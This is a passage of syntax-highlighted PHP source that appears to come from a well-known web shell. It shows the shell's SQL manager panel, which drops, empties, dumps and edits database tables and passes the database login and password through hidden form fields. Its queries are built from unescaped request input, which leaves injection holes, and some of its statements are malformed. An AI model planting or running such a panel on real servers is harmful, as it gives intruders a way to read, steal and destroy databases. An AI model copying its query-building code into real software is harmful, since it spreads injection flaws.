class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;Databases (&quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="nv">$dbs</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="cp">?&gt;</span><span class="x">&amp;lt;/select&amp;gt;&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;Please, select database&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Go&quot;&amp;gt;&amp;lt;/form&amp;gt;</span>
<span class="x">          </span><span class="cp">&lt;?php</span>
        <span class="p">}</span>
        <span class="c1">//End left panel</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
        <span class="c1">//Start center panel</span>
        <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span><span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$c</span> <span class="o">=</span> <span class="s2">&quot;no&quot;</span><span class="p">;}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;There are &quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot; table(s) in this DB (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;).&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$dbquicklaunch</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbsqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">;}}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
          <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dump&quot;</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldrop&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DROP TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblempty&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldump&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$boxtbl</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="nv">$boxtbl</span><span class="p">;}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$thistbl</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;dump&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblcheck&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;CHECK TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbloptimize&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;OPTIMIZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblrepair&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;REPAIR TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblanalyze&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;ANALYZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;deleterow&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$boxrow_all</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$boxrow</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$keys</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
              <span class="nv">$akeys</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">);</span>
              <span class="k">foreach</span> <span class="p">(</span><span class="nv">$akeys</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`, &quot;</span><span class="p">;}</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$keys</span><span class="p">))</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$keys</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$keys</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
              <span class="nv">$values</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
              <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
              <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span> <span class="o">=</span> <span class="nv">$sql_tbl_insert_functs</span><span class="p">[</span><span class="nv">$akeys</span><span class="p">[</span><span class="nv">$i</span><span class="p">]])</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="nv">$funct</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;, &quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;}</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$values</span><span class="p">))</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$values</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$values</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
              <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` ( &quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot; ) VALUES ( &quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot; );&quot;</span><span class="p">;</span>
              <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
              <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$set</span> <span class="o">=</span> <span class="nx">mysql_buildwhere</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">,</span><span class="s2">&quot;, &quot;</span><span class="p">,</span><span class="nv">$sql_tbl_insert_functs</span><span class="p">);</span>
              <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;UPDATE `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` SET &quot;</span><span class="o">.</span><span class="nv">$set</span><span class="o">.</span><span class="s2">&quot; WHERE &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
              <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
              <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
              <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
              <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;query&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;table border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to:&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query :&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">sql_query</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">100</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_confirm</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span>
            <span class="cp">?&gt;</span><span class="x">&amp;lt;table border=&quot;0&quot; width=&quot;100%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;Create new table:&amp;lt;/b&amp;gt;</span>
<span class="x">            &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newtbl&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;text&quot; name=&quot;sql_newtbl&quot; size=&quot;20&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;submit&quot; value=&quot;Create&quot;&amp;gt;</span>
<span class="x">            &amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;Dump DB:&amp;lt;/b&amp;gt;</span>
<span class="x">            &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;dump&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
